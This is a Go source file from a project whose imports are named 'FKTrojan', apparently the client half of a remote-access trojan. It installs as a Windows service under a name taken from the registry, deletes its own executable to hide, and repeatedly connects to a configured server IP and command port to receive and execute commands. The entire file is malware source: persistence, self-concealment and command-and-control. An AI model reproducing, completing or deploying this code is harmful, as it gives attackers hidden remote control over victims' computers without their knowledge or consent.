package hide_client

import (
	. "FKTrojan/command_handler_client"
	. "FKTrojan/config_client"
	"FKTrojan/service_command"
	"io"
	"log"
	"time"

	. "FKTrojan/flog"

	"github.com/kardianos/service"
)

var logger service.Logger

type program struct{}

func (p *program) Start(s service.Service) error {
	// Start should not block. Do the actual work async.
	go p.run()
	return nil
}

func mainRun() error {
	countOfAcceptCommandSameTime := 3
	countControlChan := make(chan int, countOfAcceptCommandSameTime)
	for {
		countControlChan <- 1
		go func() {
			service_command.HandleCommand(Conf.ServerIp, Conf.CmdPort, func(r io.Reader, w io.Writer) error {
				return service_command.ClientHandler(r, w, ClientDo)
			})
			time.Sleep(time.Second)
			<-countControlChan
		}()
	}
	return nil
}

func (p *program) run() {
	// Do work hereticker := time.NewTicker(20 * time.Millisecond)
	Flog.Printf("main run ")
	DeleteExePath()
	errChan := make(chan error)
	go func() {
		errChan <- mainRun()
	}()
	Flog.Printf("error in program %v", <-errChan)
}
func (p *program) Stop(s service.Service) error {
	// Stop should not block. Return with a few seconds.
	return nil
}

func Master() {
	Load()
	si, err := readRegistry()
	// 如果读取失败，则自动安装+启动服务并退出
	if err != nil {
		Flog.Fatal(err)
	}

	svcConfig := &service.Config{
		Name:        si.Name,
		DisplayName: si.DisplayName,
		Description: si.Desc,
	}

	prg := &program{}
	s, err := service.New(prg, svcConfig)
	if err != nil {
		log.Fatal(err)
	}
	logger, err = s.Logger(nil)
	if err != nil {
		log.Fatal(err)
	}
	err = s.Run()
	if err != nil {
		logger.Error(err)
	}
}
func Debug() {
	Load()
	mainRun()
}
